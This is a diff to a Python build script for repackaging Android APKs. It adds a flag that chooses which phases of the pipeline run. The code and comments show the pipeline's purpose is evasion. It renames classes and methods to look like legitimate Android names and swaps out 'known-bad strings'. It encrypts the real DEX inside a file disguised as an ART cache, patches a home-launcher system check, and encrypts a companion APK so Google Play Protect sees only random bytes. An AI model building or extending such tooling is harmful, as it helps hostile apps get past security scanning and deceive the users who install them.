@@ -3547,10 +3547,15 @@ def main():
         step_rename_smali(new_pkg)
 
     _phase1_only = os.environ.get("PHASE1_ONLY", "").lower() in ("1", "true", "yes")
+    _phase12_only = os.environ.get("PHASE12_ONLY", "").lower() in ("1", "true", "yes")
+    # PHASE12_ONLY = run PHASE_1 + PHASE_2, skip PHASE_3 / PHASE_6 / SIGNING / ENCRYPT_COMPANION
+    # PHASE1_ONLY  = run PHASE_1 only, skip everything else (overrides PHASE12_ONLY)
     if _phase1_only:
         print("  ⚡ PHASE1_ONLY=true — skipping PHASE_2 / PHASE_3 / PHASE_6 / SIGNING / STEP_ENCRYPT_COMPANION")
+    elif _phase12_only:
+        print("  ⚡ PHASE12_ONLY=true — running PHASE_1 + PHASE_2, skipping PHASE_3 / PHASE_6 / SIGNING / STEP_ENCRYPT_COMPANION")
 
-    if not _phase1_only:
+    if not _phase1_only and not _phase12_only:
         with track("PHASE_6", "STEP_6A", "Rename companion classes to legitimate Android names"):
             class_rename_map = step_6a_rename_classes(new_pkg)
     else:
@@ -3561,11 +3566,11 @@ def main():
     with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
         step_patch_home_launcher()
 
-    if not _phase1_only:
+    if not _phase1_only and not _phase12_only:
         with track("PHASE_6", "STEP_6C", "Replace known-bad strings with legitimate equivalents"):
             step_6c_replace_bad_strings(new_pkg, class_rename_map)
 
-    if not _phase1_only:
+    if not _phase1_only and not _phase12_only:
         with track("PHASE_6", "STEP_6D", "Rename custom methods to legitimate Android-style names"):
             step_6d_rename_methods(new_pkg)
 
@@ -3590,7 +3595,7 @@ def main():
     # new_dex is replaced with tiny stub (~4KB). Encrypted real DEX goes into
     # assets/oat/arm64/base.<hash8>.odex — looks like legitimate ART cache file.
     _app_class_final = class_rename_map.get("App", "App")
-    if not _phase1_only:
+    if not _phase1_only and not _phase12_only:
         with track("PHASE_3", "STEP_DEX_PROTECT", "Encrypt DEX + replace with stub", MOD_ASSET):
             (new_dex,
              _dex_enc_blob, _dex_odex_path,
@@ -3632,7 +3637,7 @@ def main():
         os.replace(_tmp_ver, _apk_tmp)
         print(f"  ✅ Step 9A version patch applied")
 
-    if not _phase1_only:
+    if not _phase1_only:  # PHASE_2 — runs for both full build and PHASE12_ONLY
         with track("PHASE_2", "STEP_13_UNICODE", "Deep unicode folder nesting companion [Step 13]", "companion_renamed_unsigned.apk"):
             step_unicode_nest(build_hash)
 
@@ -4029,7 +4034,7 @@ def main():
     # After this point nothing reads MOD_ASSET as a zip — safe to encrypt.
     # Raw APK entropy = 6.239 (GPP reads all permissions/DEX).
     # Encrypted blob entropy = 8.000 (GPP sees random bytes only).
-    if not _phase1_only:
+    if not _phase1_only and not _phase12_only:
         with track("PHASE_1", "STEP_ENCRYPT_COMPANION", "Encrypt companion APK binary [Step 8A FIX]", MOD_ASSET):
             step_encrypt_companion()
 
